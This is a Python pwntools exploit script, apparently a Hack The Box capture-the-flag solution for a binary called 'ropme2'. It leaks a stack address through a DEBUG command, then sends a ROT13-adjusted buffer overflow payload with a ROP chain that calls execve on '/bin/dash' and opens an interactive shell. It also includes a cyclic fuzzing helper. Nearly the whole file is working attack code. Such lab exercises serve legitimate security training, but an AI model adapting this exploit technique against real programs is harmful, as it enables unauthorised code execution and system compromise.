#!/usr/bin/python

from pwn import *
import string
import re
import time

BINARY = './ropme2'
BUFFSIZE = 216
CONTEXT = 'INFO'

pop_rdi = p64(0x40142b)
pop_rsi = p64(0x401429)
pop_rax = p64(0x401162)
pop_rdx = p64(0x401164)
read_addr = p64(0x4033f0)
syscall = p64(0x401168)
dynamic = p64(0x4031e8)
main_addr = p64(0x401080)
format_addr = p64(0x402020)


def rot13(pay):
    newpayload = ''
    for i in range(len(pay)):
        if pay[i] in string.ascii_lowercase:
            temp = string.ascii_lowercase[(string.ascii_lowercase.index(pay[i]) + 13) % len(string.ascii_lowercase)]
        elif pay[i] in string.ascii_uppercase:
            temp = string.ascii_uppercase[(string.ascii_uppercase.index(pay[i]) + 13) % len(string.ascii_uppercase)]
        else:
            temp = pay[i]
        newpayload+=temp
    return newpayload

def parse_addr(message):
    addr = re.findall(r'0x[a-f0-9]*\n',message)[0].strip()
    return addr

def get_debug(process,recv_first=True):
    payload = "DEBUG"
    if recv_first:
        print(process.recvline()),
        print(payload)
    process.sendline(payload)
    message = process.recvline()
    print(message),
    address = parse_addr(message)
    return address

def leak(proc):
    fill = "A"*(BUFFSIZE-10)
    address = get_debug(proc)
    
    payload = rot13("/bin/dash\x00")+fill
    payload += rot13(pop_rdi) + p64(int(address,0)-224)
    payload += pop_rsi + p64(0) + p64(0)
    payload += pop_rdx + p64(0) + p64(0)
    payload += pop_rax + p64(59)
    payload += syscall
    payload += rot13(main_addr)

    print(proc.recvline()),
    print("Sent: {}".format(payload))
    proc.sendline(payload)
    proc.interactive()

def overflow(proc,num):
    try:
        data = cyclic(num)
        proc.sendline(data)
        exit_code = proc.poll(block=True)
        if exit_code is not None and exit_code < -1:
            print("Exit code: {} on {}".format(exit_code,num))
            raise
    except Exception as e:
        log.critical("Broke on input:\n{}".format(data))
        print("Broken")
        raise e
    pass

def exploit():
    pass

def logit(data):
    with open("payload","ab") as f:
        f.write(data)

def setup():
    global binary
    binary = ELF(BINARY)
    with open("payload","wb") as f:
        pass

    if CONTEXT is not None:
        context.log_level=CONTEXT

def main():
    setup()
    
    p = process(BINARY)
    #p = remote("docker.hackthebox.eu",44744)
    leak(p)
    p.close()

if __name__ == '__main__':
    main()
